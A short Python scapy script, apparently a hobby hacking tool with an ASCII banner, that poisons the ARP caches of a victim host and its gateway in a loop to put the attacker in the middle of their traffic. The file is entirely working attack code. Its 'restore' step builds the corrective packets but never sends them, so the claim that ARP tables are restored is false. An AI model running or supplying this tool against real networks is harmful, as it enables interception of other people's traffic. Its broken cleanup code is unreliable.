#!/usr/bin/python

import scapy.all as scapy
import time
logo = '''

 /$$   /$$ /$$   /$$ /$$   /$$ /$$   /$$                               /$$       /$$ /$$
| $$  | $$| $$  | $$| $$  | $$| $$  | $$                              | $$      |__/| $$
| $$  | $$| $$  | $$| $$  | $$| $$  | $$  /$$$$$$   /$$$$$$   /$$$$$$$| $$$$$$$  /$$| $$
| $$$$$$$$| $$$$$$$$| $$$$$$$$| $$$$$$$$ |____  $$ /$$__  $$ /$$_____/| $$__  $$| $$| $$
| $$__  $$| $$__  $$| $$__  $$| $$__  $$  /$$$$$$$| $$  \__/|  $$$$$$ | $$  \ $$| $$| $$
| $$  | $$| $$  | $$| $$  | $$| $$  | $$ /$$__  $$| $$       \____  $$| $$  | $$| $$| $$
| $$  | $$| $$  | $$| $$  | $$| $$  | $$|  $$$$$$$| $$       /$$$$$$$/| $$  | $$| $$| $$
|__/  |__/|__/  |__/|__/  |__/|__/  |__/ \_______/|__/      |_______/ |__/  |__/|__/|__/

'''
print(logo)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip) 
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_ls = scapy.srp(arp_request_broadcast, timeout=1, verbose = False)[0]

    return answered_ls[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # sending a packet to the victim saying I have the mac address
    scapy.send(packet, verbose=False)

def restore(dest_ip, src_ip): #used to restore spoofed mac address 
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac) #arp response using get mac function to get src + dest mac 
    print(packet.show())
    print(packet.summary())

victim_ip = input('Please enter the target IP: ') #not using arguments this time collecting user input using varibles + input command
gateway_ip = input('Please enter the gateway IP: ')

try:
    sent_packets_count = 0
    while True:
        spoof(victim_ip, gateway_ip)
        spoof(gateway_ip, victim_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets Sent: " + str(sent_packets_count), end="") #dynamic printing to the same line while looping +2 packets sent
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[x] Shutting Down ARP Spoofer + Restoring the ARP Tables.....")
    restore(victim_ip, gateway_ip)
    restore(gateway_ip, victim_ip)
